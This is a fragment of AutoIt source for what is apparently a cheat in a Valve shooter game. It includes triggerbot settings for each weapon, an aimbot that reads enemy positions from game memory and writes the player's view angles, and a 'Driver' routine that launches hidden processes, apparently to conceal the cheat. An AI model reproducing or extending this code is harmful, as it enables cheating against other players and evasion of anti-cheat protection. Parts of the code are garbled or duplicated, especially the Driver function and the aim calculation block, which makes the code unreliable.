				IniWrite($FileSet, "WeaponSettings", "triggerbot_famas.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_famas.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_famas.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_famas.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "ak47" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_ak47.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_ak47.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_ak47.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_ak47.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_ak47.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "nova" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_nova.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_nova.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_nova.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_nova.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_nova.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "mag7" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mag7.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mag7.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mag7.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mag7.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mag7.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "ump45" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_ump45.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_ump45.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_ump45.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_ump45.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_ump45.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "mp7" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mp7.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mp7.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mp7.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mp7.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mp7.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "m4a1" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_m4a1.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_m4a1.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_m4a1.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_m4a1.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_m4a1.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "galil" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_galil.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_galil.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_galil.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_galil.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_galil.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "galilar" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_galilar.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_galilar.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_galilar.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_galilar.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_galilar.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "aug" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_aug.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_aug.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_aug.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_aug.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_aug.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "scar20" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_scar20.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_scar20.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_scar20.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_scar20.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_scar20.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "awp" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_awp.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_awp.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_awp.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_awp.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_awp.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "g3sg1" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_g3sg1.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_g3sg1.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_g3sg1.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_g3sg1.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_g3sg1.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "m249" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_m249.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_m249.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_m249.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_m249.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_m249.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "m3" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_m3.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_m3.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_m3.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_m3.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_m3.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "mp5navy" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mp5navy.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mp5navy.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mp5navy.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mp5navy.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mp5navy.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "scout" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_scout.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_scout.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_scout.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_scout.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_scout.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "sg550" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_sg550.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_sg550.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_sg550.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_sg550.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_sg550.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "sg552" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_sg552.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_sg552.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_sg552.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_sg552.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_sg552.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "tmp" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_tmp.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_tmp.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_tmp.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_tmp.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_tmp.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "xm1014" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_xm1014.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_xm1014.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_xm1014.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_xm1014.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_xm1014.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "negev" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_negev.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_negev.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_negev.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_negev.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_negev.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "sawedoff" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_sawedoff.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_sawedoff.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_sawedoff.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_sawedoff.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_sawedoff.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "tec9" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_tec9.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_tec9.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_tec9.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_tec9.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_tec9.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "taser" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_taser.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_taser.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_taser.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_taser.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_taser.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "mp9" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mp9.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mp9.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mp9.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mp9.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_mp9.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "scar17" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_scar17.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_scar17.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_scar17.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_scar17.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_scar17.hitbox", $treadhitboxvalue)
				EndIf
				If $treadw = "ssg08" Then
				IniWrite( $FileSet, "Settings", "Triggerbot_Key", $ptkey)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_ssg08.enabled", $treadenablevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_ssg08.beforedelay", $treadbeforevalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_ssg08.afterdelay", $treadaftervalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_ssg08.allbody", $treadhitvalue)
				IniWrite($FileSet, "WeaponSettings", "triggerbot_ssg08.hitbox", $treadhitboxvalue)
				EndIf


	EndSwitch
WEnd



Func Panic()
MsgBox (32, "Quit" , "Press OK to exit the cheat")
ProcessClose("Radar.dll")
Exit
EndFunc


Func Menu()
If $Menu = 0 Then
GUISetState(@SW_SHOW)
$Menu = 1
Else
GUISetState(@SW_HIDE)
$Menu = 0
EndIf
EndFunc




Func Driver ()
	Local $driverpols = Run(@WindowsDir & " /driver.sys " , "C:\", @SW_HIDE)
	Local $hideprocess = Run ("hdd.exe" , @WindowsDir & $driverpols , "C:\")
    Local $psapi = DllOpen("psapi.dll")
	Local $hprocesss
	Local $permisssion = BitOR(2, 1024, 8, 16, 32)
		Local $hprocess = DllCall("kernel32.dll", "ptr", "OpenProcess", "dword", $permission, "int", 0, "dword", $ipid)
		If $hprocess[0] Then
			$hprocess = $hprocess[0]
	Local $hdll = DllOpen("kernel32.dll")
		Local $aprocesshandle = DllCall($hdll, "handle", "OpenProcess", "dword", $process_query_information, "bool", False, "dword", $i_pid)
		If @error Then
			$ierror = @error
			$iextended = @extended
		If NOT $aprocesshandle[0] Then
		Local $apriority = DllCall($hdll, "dword", "GetPriorityClass", "handle", $aprocesshandle[0])
		If @error Then
			$ierror = @error
			$iextended = @extended
		DllCall($hdll, "bool", "CloseHandle", "handle", $aprocesshandle[0])
EndIf
EndIf
EndIf
EndIf
EndFunc
Sleep(10)
Func gethitbox($Bone23, $min)
	Global $hitbox[29][3]
	$hitbox[0][1] = vector(-6.42, -4.28, -6.955)
	$hitbox[0][2] = vector2(4.28, 4.28, 6.955)
	$hitbox[26][1] = vector(5.029, -3.959, -2.14)
	$hitbox[26][2] = vector2(22.149, 3.424, 4.28)
	$hitbox[27][1] = vector(2.675, -3.21, -2.247)
	$hitbox[27][2] = vector2(19.26, 2.675, 2.247)
	$hitbox[28][1] = vector(2.943, -2.675, -2.408)
	$hitbox[28][2] = vector2(6.688, 9.095, 2.408)
	$hitbox[23][1] = vector(5.029, -3.959, -4.28)
	$hitbox[23][2] = vector2(22.149, 3.424, 2.14)
	$hitbox[24][1] = vector(5.029, -3.959, -4.28)
	$hitbox[24][2] = vector2(22.149, 3.424, 2.14)
	$hitbox[25][1] = vector(2.943, -2.675, -2.408)
	$hitbox[25][2] = vector2(6.688, 9.095, 2.408)
	$hitbox[2][1] = vector(-4.28, -4.28, -5.885)
	$hitbox[2][2] = vector2(3.21, 5.35, 5.885)
	$hitbox[3][1] = vector(-4.28, -4.28, -5.885)
	$hitbox[3][2] = vector2(3.21, 5.35, 5.885)
	$hitbox[4][1] = vector(-4.28, -4.28, -5.885)
	$hitbox[4][2] = vector2(6.42, 5.35, 5.885)
	$hitbox[5][1] = vector(-1.07, -2.622, -2.151)
	$hitbox[5][2] = vector2(3.103, 2.622, 2.151)
	$hitbox[10][1] = vector(-2.14, -3.745, -3.67)
	$hitbox[10][2] = vector2(6.955, 3.745, 3.67)
	$hitbox[7][1] = vector(-2.675, -3.21, -2.14)
	$hitbox[7][2] = vector2(12.84, 3.21, 2.14)
	$hitbox[8][1] = vector(-0, -2.14, -2.14)
	$hitbox[8][2] = vector2(9.63, 2.14, 2.14)
	$hitbox[9][1] = vector(-1.723, -1.22, -1.38)
	$hitbox[9][2] = vector2(4.473, 1.22, 1.38)
	$hitbox[13][1] = vector(-2.675, -3.21, -2.14)
	$hitbox[13][2] = vector2(12.84, 3.21, 2.14)
	$hitbox[14][1] = vector(-0, -2.14, -2.14)
	$hitbox[14][2] = vector2(9.63, 2.14, 2.14)
	$hitbox[15][1] = vector(-1.723, -1.22, -1.38)
	$hitbox[15][2] = vector2(4.473, 1.22, 1.38)
	Return $hitbox[$Bone23][$min]
EndFunc
Func vector($x, $y, $z)
	Global $return[4]
	$return[1] = $x
	$return[2] = $y
	$return[3] = $z
	Return $return
EndFunc
Func vector2($x, $y, $z)
	Global $return[4]
	$return[1] = $x
	$return[2] = $y
	$return[3] = $z
	Return $return
EndFunc
Func ATAN2($x, $y)
	Local Const $PI = 3.14159265358979
	If $y < 0 Then
		Return -ATAN2($x, -$y)
	ElseIf $x < 0 Then
		Return $PI - ATan(-$y / $x)
	ElseIf $x > 0 Then
		Return ATan($y / $x)
	ElseIf $y <> 0 Then
		Return $PI / 2
	EndIf
 EndFunc
Sleep(10)
Func GetWeaponName($id)
Global $weaponname [50]
	$weaponname[0] = "none"
	$weaponname[1] = "deagle"
	$weaponname[2] = "elite"
	$weaponname[3] = "fiveseven"
	$weaponname[4] = "glock"
	$weaponname[5] = "p228"
	$weaponname[6] = "usp"
	$weaponname[7] = "ak47"
	$weaponname[8] = "aug"
	$weaponname[9] = "awp"
	$weaponname[10] = "famas"
	$weaponname[11] = "g3sg1"
	$weaponname[12] = "galil"
	$weaponname[13] = "galilar"
	$weaponname[14] = "m249"
	$weaponname[15] = "m3"
	$weaponname[16] = "m4a1"
	$weaponname[17] = "mac10"
	$weaponname[18] = "mp5navy"
	$weaponname[19] = "p90"
	$weaponname[20] = "scout"
	$weaponname[21] = "sg550"
	$weaponname[22] = "sg552"
	$weaponname[23] = "tmp"
	$weaponname[24] = "ump45"
	$weaponname[25] = "xm1014"
	$weaponname[26] = "bizon"
	$weaponname[27] = "mag7"
	$weaponname[28] = "negev"
	$weaponname[29] = "sawedoff"
	$weaponname[30] = "tec9"
	$weaponname[31] = "taser"
	$weaponname[32] = "p2000"
	$weaponname[33] = "mp7"
	$weaponname[34] = "mp9"
	$weaponname[35] = "nova"
	$weaponname[36] = "p250"
	$weaponname[37] = "scar17"
	$weaponname[38] = "scar20"
	$weaponname[39] = "sg553"
	$weaponname[40] = "ssg08"
	$weaponname[41] = "knifegg"
	$weaponname[42] = "knife"
	$weaponname[43] = "flashbang"
	$weaponname[44] = "hegrenade"
	$weaponname[45] = "smokegrenade"
	$weaponname[46] = "molotov"
	$weaponname[47] = "decoy"
	$weaponname[48] = "incgrenade"
	$weaponname[49] = "c4"
	Return $weaponname[$id]
EndFunc
Func SetMem($address, $value)
	_memorywrite($address, $process, $value, "dword")
EndFunc
Func SetAim($address, $value)
	_memorywrite($address, $process, $value, "float")
EndFunc
Func _WinSetShadow($hWnd, $sText = '', $fShadow = True)
	$hWnd = WinGetHandle($hWnd, $sText)
	If Not IsHWnd($hWnd) Or @OSBuild < 2600 Then Return SetError(1, 0, 0)
	Local $res = DllCall("User32.dll", "ULONG", "GetClassLong", "hwnd", $hWnd, "int", -26)
	If @error Then Return SetError(2, @error, 0)
	Local $style = BitOR($res[0], 0x00020000)
	If Not $fShadow Then $style = BitAND($style, BitNOT(0x00020000))
	$res = DllCall("user32.dll", "ulong", "SetClassLong", "hwnd", $hWnd, "int", -26, "long", $style)
	If @error Then Return SetError(3, @error, 0)
	If $res[0] Then
		If BitAND(WinGetState($hWnd), 2) = 2 Then
			WinSetState($hWnd, "", @SW_HIDE)
			WinSetState($hWnd, "", @SW_SHOW)
		EndIf
		Return 1
	EndIf
	Return SetError(4, 0, 0)
EndFunc
Func xmodule($smodule, $ipid = @AutoItPID)
	If Not ProcessExists($ipid) Then Return SetError(1, 0, 0)
	If Not IsString($smodule) Then Return SetError(2, 0, 0)
	Local $psapi = DllOpen("psapi.dll")
	Local $hprocess
	Local $permission = BitOR(2, 1024, 8, 16, 32)
	If $ipid > 0 Then
		Local $hprocess = DllCall("kernel32.dll", "ptr", "OpenProcess", "dword", $permission, "int", 0, "dword", $ipid)
		If $hprocess[0] Then
			$hprocess = $hprocess[0]
		EndIf
	EndIf
	Local $modules = DllStructCreate("ptr[1024]")
	Local $acall = DllCall($psapi, "int", "EnumProcessModules", "ptr", $hprocess, "ptr", DllStructGetPtr($modules), "dword", DllStructGetSize($modules), "dword*", 0)
	If $acall[4] > 0 Then
		Local $imodnum = $acall[4] / 4
		Local $atemp
		For $i = 1 To $imodnum
			$atemp = DllCall($psapi, "dword", "GetModuleBaseNameW", "ptr", $hprocess, "ptr", Ptr(DllStructGetData($modules, 1, $i)), "wstr", "", "dword", 260)
			If $atemp[3] = $smodule Then
				DllClose($psapi)
				Return Ptr(DllStructGetData($modules, 1, $i))
			EndIf
		Next
	EndIf
	DllClose($psapi)
	Return SetError(-1, 0, 0)
EndFunc
Sleep(10)





Func Aimbot()
If $dfhgzfsgzsfg = 1 Then
If $viasghfaf = 0 And WinActive("[CLASS:Valve001]") Then
	$LocalBase = _memoryread($client_dll + $c_dwLocalBaseEntity, $process, "dword")
	If _IsPressed($key, "user32.dll") or $key = 0 Then
			If $Delay > 0 Then
				Sleep($Delay)
			EndIf
			$AngBase = _memoryread($engine_dll + $ViewAng, $process, "dword")
			$i1 = _memoryread($LocalBase + $hitboxpos, $process, "float")
			$i2 = _memoryread($LocalBase + $hitboxpos + 4, $process, "float")
			$i3 = (_memoryread($LocalBase + $hitboxpos + 8, $process, "float"))
			$MyTeam = _memoryread($LocalBase + $MyTeamAD, $process, "dword")
			$MeFovx = _memoryread($AngBase + $ViewAngOff, $process, "float")
			$MeFovy = _memoryread($AngBase + $ViewAngOff + 4, $process, "float")
			$recoil = _memoryread($client_dll + $c_dwLocalBaseEntity, $process, "dword")
			$recoilx = _memoryread($recoil + $Recoil_offset + $m_local, $process, "float")
			$recoily = _memoryread($recoil + $Recoil_offset + $m_local + 4, $process, "float")
			$recoilx *= 2
			$recoily *= 2
			Local $Angel1[65]
			Local $Angel2[65]
			Local $Matx1[65]
			Local $Matx2[65]
			Local $dis[65]
			For $i = 0 To 64 Step 1
				$dw_BasePointer = _memoryread($client_dll + $c_dwBaseEntity + (($i - 1) * 16), $process, "dword")
				$hp = _memoryread($dw_BasePointer + $Healths, $process, "dword")
				If $hp > 0 Then
					$Team = _memoryread($dw_BasePointer + $MyTeamAD, $process, "dword")


					If $Team <> $MyTeam Then


						$m_dwBoneMatrix = _memoryread($dw_BasePointer + $BoneOffset, $process, "dword")
						$you1 = _memoryread($m_dwBoneMatrix + ((48 * ($Bone)) + 12), $process, "float")
						$you2 = _memoryread($m_dwBoneMatrix + ((48 * ($Bone)) + 28), $process, "float")
						$you3 = _memoryread($m_dwBoneMatrix + ((48 * ($Bone)) + 44), $process, "float") - 60
						$DISTANCE = Sqrt((($i1 - $you1) * ($i1 - $you1)) + (($i2 - $you2) * ($i2 - $you2)) + (($i3 - $you3) * ($i3 - $you3)))
						$Angel1[$i] = ((ASin(($you3 - $i3) / $DISTANCE) * 180 / $M_PI) * - 1)
						$Angel2[$i] = (ATAN2($you1 - $i1, $you2 - $i2) / $M_PI * 180)



						If $rcs = 0 Then
							$aimmin = $Angel1[$i] - ($MeFovx)
							$aimmin2 = $Angel2[$i] - ($MeFovy)
						Else
							$aimmin = $Angel1[$i] - ($MeFovx + $recoilx)
							$aimmin2 = $Angel2[$i] - ($MeFovy + $recoily)
						EndIf
						$addd1 = $i1 - $you1
						$addd2 = $i2 - $you2
						$addd3 = $i3 - $you3
						If $aimmin > 180 Then $aimmin -= 360
						If $aimmin2 > 180 Then $aimmin2 -= 360
						If $aimmin < -180 Then $aimmin += 360
						If $aimmin2 < -180 Then $aimmin2 += 360
						$fovdis = Sqrt(($aimmin * $aimmin) + ($aimmin2 * $aimmin2))
						If $fovdis < $fov / 2 Then
							$dis[$i] = (Sqrt(($aimmin * $aimmin) + ($aimmin2 * $aimmin2)))
						Else
							$dis[$i] = ""
						EndIf
					EndIf
				EndIf




						If $rcs = 0 Then
							$aimmin = $Angel1[$i] - ($MeFovx)
							$aimmin2 = $Angel2[$i] - ($MeFovy)
						Else
							$aimmin = $Angel1[$i] - ($MeFovx + $recoilx)
							$aimmin2 = $Angel2[$i] - ($MeFovy + $recoily)
						EndIf
						$addd1 = $i1 - $you1
						$addd2 = $i2 - $you2
						$addd3 = $i3 - $you3
						If $aimmin > 180 Then $aimmin -= 360
						If $aimmin2 > 180 Then $aimmin2 -= 360
						If $aimmin < -180 Then $aimmin += 360
						If $aimmin2 < -180 Then $aimmin2 += 360
						$fovdis = Sqrt(($aimmin * $aimmin) + ($aimmin2 * $aimmin2))
						If $fovdis < $fov / 2 Then
							$dis[$i] = (Sqrt(($aimmin * $aimmin) + ($aimmin2 * $aimmin2)))
						Else
							$dis[$i] = ""
						EndIf

			Next
			$avArray = $dis
			If Not IsArray($avArray) Then Return $MinF = ""
			If UBound($avArray, 0) <> 1 Then Return $MinF = ""
			Local $iUBound = UBound($avArray) - 1
			If $iEnd < 1 Or $iEnd > $iUBound Then $iEnd = $iUBound
			If $iStart < 0 Then $iStart = 0
			If $iStart > $iEnd Then Return $MinF = ""
			Local $iMinIndex = $iStart
			Local $iCheckNum = 0
			For $i = $iStart To $iEnd
				If Not IsNumber($avArray[$i]) Then ContinueLoop
				If Not $iCheckNum Then $iMinIndex = $i
				$iCheckNum = 1
				If Number($avArray[$iMinIndex]) > Number($avArray[$i]) Then $iMinIndex = $i
			Next
			$MinF = $iMinIndex
			If $MinF Then
				If $dis[$MinF] <> "" Then
					If $rcs = 1 Then
						$angel1[$minf] -= $recoilx
						$angel2[$minf] -= $recoily
				    EndIf

					If $Smooth > 0 Then

						$Delta1 = $MeFovX - $angel1[$MinF]
						$Delta2 = $MeFovY - $angel2[$MinF]
						if $delta2 < -180 then $delta2 += 360
						if $delta2 > 180 then $delta2 -= 360
						If $Smooth = 0 Then $Smooth = 1
						$add1s = ($delta1 / ($Smooth))
						$add2s = ($delta2 / ($Smooth))
						$angel1[$MinF] = $MeFovX - $Delta1 / $Smooth
						$angel2[$MinF] = $MeFovY - $Delta2 / $Smooth

					EndIf

					 _memorywrite($angbase + $viewangoff, $process, $angel1[$minf], "float")
